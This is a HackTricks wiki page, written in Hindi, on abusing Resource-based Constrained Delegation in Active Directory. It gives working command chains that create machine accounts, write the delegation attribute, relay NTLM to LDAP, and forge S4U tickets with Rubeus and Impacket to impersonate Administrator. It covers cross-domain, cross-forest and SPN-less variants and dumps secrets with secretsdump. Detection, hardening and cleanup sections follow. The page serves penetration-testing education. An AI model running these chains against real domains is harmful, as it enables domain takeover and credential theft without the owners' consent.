# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation की मूल बातें

Resource-based constrained delegation (RBCD), [constrained delegation](constrained-delegation.md) के समान है, लेकिन trust direction उलटी होती है। Traditional constrained delegation यह रिकॉर्ड करता है कि कोई principal किन services को delegate कर सकता है; RBCD **target resource** पर यह रिकॉर्ड करता है कि कौन-से principals उस resource पर users का impersonate कर सकते हैं।<sup>[[12]](#references)</sup>

Target object का _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ attribute एक security descriptor रखता है, जो उन principals की पहचान करता है जिन्हें उस resource पर अन्य identities की ओर से कार्य करने की अनुमति है।

एक अन्य महत्वपूर्ण अंतर यह है कि **write permissions over a machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty`, और समान rights) रखने वाला principal _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ को set करने में सक्षम हो सकता है। Traditional constrained delegation configure करने के लिए सामान्यतः अधिक privileged administrative access आवश्यक होता है।<sup>[[1]](#references)</sup>

अधिक सटीक रूप से, classic constrained-delegation settings को बदलना सामान्यतः domain controller पर `SeEnableDelegationPrivilege` द्वारा नियंत्रित होता है। यह right आमतौर पर अत्यधिक privileged administrators के पास होता है। RBCD इस निर्णय को target object's security descriptor पर स्थानांतरित कर देता है, इसलिए user right के बिना relevant computer-object property पर write access पर्याप्त हो सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### New Concepts

`userAccountControl` में **`TrustedToAuthForDelegation`** flag को अक्सर **S4U2Self** के लिए prerequisite बताया जाता है, लेकिन यह अधूरा है।\
SPN वाला service principal इस flag के बिना भी S4U2Self request कर सकता है। `TrustedToAuthForDelegation` के साथ लौटाया गया service ticket **forwardable** होता है; इसके बिना ticket सामान्यतः **non-forwardable** होता है।<sup>[[5]](#references)</sup>

Traditional constrained delegation, S4U2Proxy step में **non-forwardable TGS** को reject करता है। RBCD उस S4U2Self ticket को स्वीकार कर सकता है, जब target का security descriptor requesting service को authorize करता हो।<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Attack structure

> यदि आपके पास **computer account** पर **write-equivalent privileges** हैं, तो आप उस machine तक privileged access प्राप्त करने में सक्षम हो सकते हैं।

मान लें कि attacker के पास पहले से **victim computer object** पर **write-equivalent privileges** हैं।

1. Attacker किसी **SPN** वाले account को **compromise** करता है या एक बनाता है ("Service A")। डिफ़ॉल्ट रूप से, authenticated domain user अधिकतम 10 computer objects बना सकता है, जिसे **_MachineAccountQuota_** नियंत्रित करता है; computer object अपने-आप उपयोगी SPNs प्रदान करता है।
2. Attacker victim computer (ServiceB) पर अपने **WRITE privilege** का **abuse** करके **resource-based constrained delegation** configure करता है, ताकि ServiceA उस victim computer (ServiceB) के विरुद्ध किसी भी user का impersonate कर सके।
3. Attacker Service A से Service B के लिए ऐसे user के नाम पर **full S4U attack** (S4U2Self और S4U2Proxy) करने हेतु Rubeus का उपयोग करता है, जिसके पास **Service B तक privileged access** है।
1. S4U2Self (compromised या created SPN account से): **Administrator को Service A के लिए represent करने वाला TGS** request करें (non-forwardable)।
2. S4U2Proxy: उस **non-forwardable TGS** का उपयोग करके **victim host** के लिए **Administrator** को represent करने वाला service ticket request करें।
3. यह non-forwardable ticket इस RBCD flow में फिर भी काम कर सकता है, क्योंकि Service A target resource के security descriptor में authorized है।
4. Attacker **pass-the-ticket** कर सकता है और user का **impersonate** करके victim ServiceB तक **access** प्राप्त कर सकता है।<sup>[[1]](#references)</sup>

Domain के _**MachineAccountQuota**_ को check करने के लिए आप इसका उपयोग कर सकते हैं:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला

### Computer Object बनाना

आप **[powermad](https://github.com/Kevin-Robertson/Powermad):** का उपयोग करके domain के अंदर एक Computer Object बना सकते हैं<sup>[[3]](#references)[[4]](#references)</sup>।
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation को कॉन्फ़िगर करना

**Active Directory PowerShell module का उपयोग करना**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview का उपयोग**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### एक complete S4U attack करना (Windows/Rubeus)

सबसे पहले, हमने `123456` password के साथ नया Computer object बनाया था, इसलिए हमें उस password का hash चाहिए:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह उस account के RC4 और AES hashes print करेगा।\
अब, attack किया जा सकता है:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` param का उपयोग करके केवल एक बार पूछकर अधिक services के लिए अधिक tickets generate कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Users को **"Account is sensitive and cannot be delegated."** के रूप में चिह्नित किया जा सकता है। यदि यह flag enabled है, तो इस delegation flow के माध्यम से account का impersonation नहीं किया जा सकता। BloodHound analysis के दौरान इस property को प्रदर्शित करता है।

### Linux tooling: Impacket के साथ end-to-end RBCD (2024+)

यदि आप Linux से operate करते हैं, तो official Impacket tools का उपयोग करके पूरी RBCD chain perform कर सकते हैं:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
नोट्स
- यदि LDAP signing/LDAPS enforced है, तो `impacket-rbcd -use-ldaps ...` का उपयोग करें।
- AES keys को प्राथमिकता दें; कई modern domains RC4 को restrict करते हैं। Impacket और Rubeus दोनों AES-only flows को support करते हैं।
- Impacket कुछ tools के लिए `sname` ("AnySPN") को rewrite कर सकता है, लेकिन जब भी संभव हो सही SPN प्राप्त करें (जैसे, CIFS/LDAP/HTTP/HOST/MSSQLSvc)।

## Cross-domain & cross-forest RBCD

यदि आपके नियंत्रण वाला **delegating principal** **resource computer** से **different domain** (या यहां तक कि **different forest**) में रहता है, तो abuse अभी भी **RBCD** है, लेकिन ticket flow अब सामान्य single-domain `S4U2Self -> S4U2Proxy` जैसा नहीं रहता।

### Cross-domain RBCD: foreign principal को SID द्वारा configure करना

जब आप **different domain** से `msDS-AllowedToActOnBehalfOfOtherIdentity` set करते हैं, तो foreign machine/user target domain LDAP में name द्वारा **resolvable** न हो सकता है। ऐसी स्थिति में, delegation entry को उसके sAMAccountName/UPN के बजाय foreign principal के **SID** का उपयोग करके configure करें।

यह विशेष रूप से तब relevant है जब `ntlmrelayx.py` के साथ NTLM को LDAP पर relay किया जा रहा हो:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` `ntlmrelayx.py` को `--escalate-user` को SID के रूप में समझने के लिए बताता है, जो तब आवश्यक होता है जब delegating account target domain का न हो।
- भले ही tool `User not found in LDAP` प्रदर्शित करे, delegation write फिर भी सफल हो सकता है, क्योंकि security descriptor foreign SID को सीधे store करता है।

### Cross-domain RBCD: cross-realm S4U sequence

जब foreign principal `msDS-AllowedToActOnBehalfOfOtherIdentity` में मौजूद हो, तो कार्यशील cross-domain flow यह है:<sup>[[9]](#references)[[13]](#references)</sup>

1. Delegating principal के अपने domain से उसका **TGT** प्राप्त करें।
2. `krbtgt/<target-domain>` के लिए **referral TGT** का अनुरोध करें।
3. Target-domain DC पर impersonated user के लिए **cross-realm S4U2Self referral** का अनुरोध करें।
4. Delegator domain में उस user के लिए वास्तविक **S4U2Self** ticket का अनुरोध करें।
5. Delegator domain में **S4U2Proxy** का उपयोग करके target domain के लिए referral ticket प्राप्त करें।
6. `cifs/host.target`, `host/host.target`, आदि के लिए service ticket प्राप्त करने हेतु target-domain DC पर अंतिम **S4U2Proxy** करें।

इसी कारण stock Linux tooling अक्सर cross-domain RBCD में विफल हो जाती है:<sup>[[9]](#references)</sup>
- `TGS-REQ` में उपयोग किए गए TGT के realm से request **realm** अलग होना आवश्यक हो सकता है
- chain में **independent S4U2Proxy steps** आवश्यक हैं, केवल `S4U2Self` या `S4U2Self` के तुरंत बाद एक single `S4U2Proxy पर्याप्त नहीं है

### Linux से Cross-domain RBCD

Synacktiv ने एक Impacket `getST.py` implementation प्रकाशित की, जो दो KDCs को स्पष्ट रूप से handle करके Linux से cross-realm sequence को दोहराती है:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operationally, नए arguments हैं:
- `-dc-ip`: **delegating** domain का DC
- `-targetdomain`: **resource computer** का domain
- `-targetdc`: **resource** domain का DC

### Cross-forest RBCD limitations

Cross-forest RBCD की एक महत्वपूर्ण limitation है: **impersonated user का उसी forest से संबंधित होना आवश्यक है जिसमें delegating principal मौजूद है**। दूसरे शब्दों में, यदि आपका controlled machine account `valhalla.local` में है और target resource `asgard.local` में है, तो आप सामान्यतः RBCD के माध्यम से उस resource पर arbitrary `asgard.local` users को **impersonate नहीं कर सकते**।<sup>[[9]](#references)</sup>

फिर भी यह इन स्थितियों में exploitable है:
- **delegating forest** का user दूसरे forest के resource host पर **local admin** (या किसी अन्य रूप से privileged) हो
- कोई trust आवश्यक authentication path की अनुमति देता हो और target computer के security descriptor में foreign SID स्वीकार किया जाता हो

### Cross-forest RBCD protocol quirks

Cross-forest RBCD केवल "cross-domain plus a trust" नहीं है। Observed flow में दो quirks शामिल हैं जिन्हें common tooling ऐतिहासिक रूप से miss करता है:<sup>[[9]](#references)</sup>

1. एक अतिरिक्त **S4U2Proxy** request, जो **`PA-PAC-OPTIONS=branch-aware`** सेट करती है
2. एक final service ticket, जो अन्य etypes के request किए जाने पर भी **RC4** का उपयोग करके return किया जा सकता है

Practical flow यह है:

1. Forest A में delegating principal के लिए TGT प्राप्त करें।
2. Forest A में impersonated user के लिए **S4U2Self** request करें।
3. Forest A में **S4U2Proxy** request करके forest B के लिए referral TGT प्राप्त करें।
4. Forest A में दूसरा **S4U2Proxy** भेजें, जिसमें S4U2Self ticket को additional ticket के रूप में शामिल न करें, लेकिन `branch-aware` enabled हो, ताकि forest B के लिए एक अन्य referral TGT प्राप्त किया जा सके।
5. वैकल्पिक रूप से forest B में delegating principal के लिए normal service ticket request करें (final abuse के लिए इस ticket की आवश्यकता नहीं है)।
6. Steps 3 और 4 से प्राप्त referral tickets का उपयोग करके forest B में target SPN के लिए impersonated forest-A user का final **S4U2Proxy** ticket request करें।

### Cross-forest RBCD from Linux

वही Synacktiv Impacket branch इस logic के लिए `-forest` switch जोड़ता है:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

**multi-domain forests** में, **S4U2Self** और **S4U2Proxy** दोनों एक referral के बाद रुकने के बजाय **recursive** हो सकते हैं:

- **Recursive S4U2Self**: पहला `S4U2Self` **impersonated user's domain** को भेजा जाता है, intermediate parent/child hops को `krbtgt/<REALM>` के लिए सामान्य `TGS-REQ` referrals के साथ पार किया जाता है, और अंतिम **S4U2Self** **delegating principal's own domain** में भेजा जाता है।
- इसका अर्थ है कि किसी machine account के लिए केवल **TGT** रखना ही उसी forest के किसी अन्य domain के **admin** का impersonation करने और `cifs/host`, `host/host`, `wsman/host` आदि का request करने के लिए पर्याप्त हो सकता है।
- **Recursive S4U2Proxy** भी इसी तरह trust chain का अनुसरण करता है: intermediate hops अगले `krbtgt/<REALM>` referral का request करते समय पिछले ticket को TGT के रूप में reuse करते हैं, और केवल अंतिम hop final service ticket लौटाता है।<sup>[[10]](#references)</sup>

एक practical same-forest उदाहरण है:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

यदि **delegating principal एक ऐसा user है जिसके पास SPN नहीं है**, तो अंतिम recursive `S4U2Self` **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** के साथ fail हो जाता है। Workaround के रूप में **केवल अंतिम hop को `S4U2Self+U2U` के रूप में retry करें**।<sup>[[10]](#references)</sup>

Abuse chain का संक्षिप्त संस्करण:

1. **NT hash** से authenticate करें, ताकि KDC को **RC4-HMAC (etype 23)** की ओर push किया जा सके।
2. पहले **`-self -u2u`** request करें और इस ticket को बाद के proxy step से अलग रखें।
3. `describeTicket.py` से **TGT session key** extract करें।
4. `changepasswd.py -newhashes <session_key>` का उपयोग करके user's **NT hash** को उस **session key** से replace करें।
5. एक अलग **`-proxy`** request के दौरान `S4U2Self+U2U` ticket को **`-additional-ticket`** के रूप में reuse करें।
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operational caveats:

- जब **पहला trusted hop पहले से ही another forest** हो, तो native Windows behavior से मेल खाने के लिए **branch-aware** algorithm (`getST.py ... -forest`) को प्राथमिकता दें। यदि foreign forest chain में केवल बाद में पहुंचता है, तो non-branch-aware recursive flow फिर भी काम कर सकता है।<sup>[[9]](#references)</sup>
- हाल के **Windows Server 2022/2025** DCs पर, RC4 deprecation के कारण forced RC4 विफल हो सकता है और **`KDC_ERR_ETYPE_NOSUPP`** मिल सकता है; इससे **SPN-less RBCD** असंभव हो सकता है, भले ही classic SPN-backed RBCD AES के साथ काम करता रहे।<sup>[[15]](#references)</sup>
- User का hash/password बदलने से पहले **`S4U2Self+U2U`** चलाएं: `SamrChangePasswordUser` account की Kerberos AES keys को recompute **नहीं** करता, इसलिए पहले password बदलने से बाद के ticket requests विफल हो सकते हैं।<sup>[[14]](#references)</sup>
- Impersonated account अभी भी **delegable** होना चाहिए: **Protected Users** और **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** वाले accounts chain को block करते हैं।

## Detection / hardening notes

- Domains/forests के across RBCD paths अभी भी आमतौर पर **ACL abuse** या **relay-to-LDAP** के माध्यम से बनाए जाते हैं। Common setup paths को रोकने के लिए DCs पर **LDAP signing** और **LDAP channel binding** लागू करें।
- Audit करें कि computer objects पर `msDS-AllowedToActOnBehalfOfOtherIdentity` लिखने की अनुमति किसे है और stored SIDs को resolve करें, जिसमें **foreign security principals** भी शामिल हैं।
- Trust-heavy environments में **Selective Authentication**, **SID filtering**, और यह review करें कि foreign forest के users के पास resource hosts पर **local admin** rights हैं या नहीं।

### Accessing

अंतिम command line **complete S4U attack** करेगी और Administrator से victim host में **TGS** को **memory** में inject करेगी।\
इस example में Administrator से **CIFS** service के लिए TGS request किया गया था, इसलिए आप **C$** access कर सकेंगे:
```bash
ls \\victim.domain.local\C$
```
### अलग-अलग service tickets का Abuse

[**उपलब्ध service tickets के बारे में यहां जानें**](silver-ticket.md#available-services)।

## Enumeration, auditing और cleanup

### RBCD configured वाले computers की Enumeration

PowerShell (SIDs को resolve करने के लिए SD को decode करना):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (एक ही command से read या flush करें):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD Cleanup / reset

- PowerShell (attribute को clear करें):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: इसका अर्थ है कि kerberos को DES या RC4 का उपयोग न करने के लिए configure किया गया है और आप केवल RC4 hash दे रहे हैं। Rubeus को कम से कम AES256 hash दें (या उसे rc4, aes128 और aes256 hashes दें)। उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- सामान्य user के लिए `-self` के दौरान **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegating principal के पास संभवतः **SPN नहीं है**। एक नियमित **`S4U2Self`** के बजाय **`S4U2Self+U2U`** के रूप में **last hop** को फिर से आज़माएँ।<sup>[[10]](#references)</sup>
- **SPN-less RBCD** के दौरान **`KDC_ERR_ETYPE_NOSUPP`**: हाल के DCs, **`S4U2Self+U2U`** + session-key-substitution trick के लिए आवश्यक forced **RC4-HMAC** path को अस्वीकार कर सकते हैं। इसके बजाय AES के साथ classic **SPN-backed** RBCD path आज़माएँ।<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: इसका अर्थ है कि वर्तमान computer का समय DC के समय से अलग है और kerberos ठीक से काम नहीं कर रहा है।
- **`preauth_failed`**: इसका अर्थ है कि दिया गया username + hashes login करने के लिए काम नहीं कर रहे हैं। संभव है कि hashes generate करते समय आप username के अंदर `"$"` लगाना भूल गए हों (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: इसका अर्थ हो सकता है:
- जिस user की impersonate करने का आप प्रयास कर रहे हैं, वह इच्छित service को access नहीं कर सकता (क्योंकि आप उसकी impersonate नहीं कर सकते या उसके पास पर्याप्त privileges नहीं हैं)
- मांगी गई service मौजूद नहीं है (यदि आप winrm के लिए ticket मांग रहे हैं, लेकिन winrm चल नहीं रहा है)
- बनाए गए fakecomputer ने vulnerable server पर अपने privileges खो दिए हैं और आपको उन्हें वापस देना होगा।
- आप classic KCD का abuse कर रहे हैं; याद रखें कि RBCD non-forwardable S4U2Self tickets के साथ काम करता है, जबकि KCD के लिए forwardable tickets आवश्यक हैं।

## Notes, relays and alternatives

- यदि LDAP filtered है, तो आप AD Web Services (ADWS) के माध्यम से भी RBCD SD लिख सकते हैं। देखें:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Local SYSTEM प्राप्त करने के लिए Kerberos relay chains अक्सर एक step में RBCD पर समाप्त होती हैं। Practical end-to-end examples देखें:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- यदि LDAP signing/channel binding **disabled** हैं और आप machine account create कर सकते हैं, तो **KrbRelayUp** जैसे tools coerced Kerberos auth को LDAP पर relay कर सकते हैं, target computer object पर आपके machine account के लिए `msDS-AllowedToActOnBehalfOfOtherIdentity` set कर सकते हैं और off-host से S4U के माध्यम से तुरंत **Administrator** की impersonate कर सकते हैं।<sup>[[8]](#references)</sup>

## References

- [1] [Resource-Based Constrained Delegation का abuse करके Active Directory पर हमला: Wagging the Dog](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation पर एक और शब्द – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [हाल के syntax के साथ त्वरित Linux cheatsheet](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Cross-domain और cross-forest RBCD की खोज](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Cross-domain और cross-forest RBCD की खोज: भाग 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
